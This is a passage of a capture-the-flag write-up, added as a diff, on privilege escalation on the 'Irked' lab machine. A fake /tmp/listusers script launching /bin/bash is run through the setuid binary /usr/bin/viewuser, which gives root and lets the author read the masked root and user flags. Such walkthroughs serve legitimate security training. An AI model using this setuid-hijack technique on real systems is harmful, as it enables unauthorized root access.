@@ -226,3 +226,44 @@ ircd@irked:/usr/bin$
 ```
 
 so we create a file 
+
+```
+ircd@irked:~/Unreal3.2$ echo "#! /bin/bash" > /tmp/listusers
+echo "#! /bin/bash" > /tmp/listusers
+ircd@irked:~/Unreal3.2$ echo "/bin/bash" >> /tmp/listusers
+echo "/bin/bash" >> /tmp/listusers
+ircd@irked:~/Unreal3.2$ cat /tmp/listusers
+cat /tmp/listusers
+#! /bin/bash
+/bin/bash
+ircd@irked:~/Unreal3.2$ chmod +x /tmp/listusers
+chmod +x /tmp/listusers
+ircd@irked:~/Unreal3.2$ /usr/bin/viewuser
+/usr/bin/viewuser
+(unknown) :0           2021-02-20 21:23 (:0)
+id
+uid=0(root) gid=1001(ircd) groups=1001(ircd)
+cat /root/root.txt
+8d8eXXXXXXXXXXXXXXXXX
+ls /home 
+djmardov
+ircd
+ls /home/djmardov 
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+ls /home/djmardov/Desktop
+ls /home/djmardov/Documents
+user.txt
+cat /home/djmardov/Documents/user.txt
+4a66XXXXXXXXXXXXXXXXX
+
+
+```
+
+So we created a /tmp/listusers to run /bin/bash, and run the setuid script to get root access. Now we can get root and user flags.
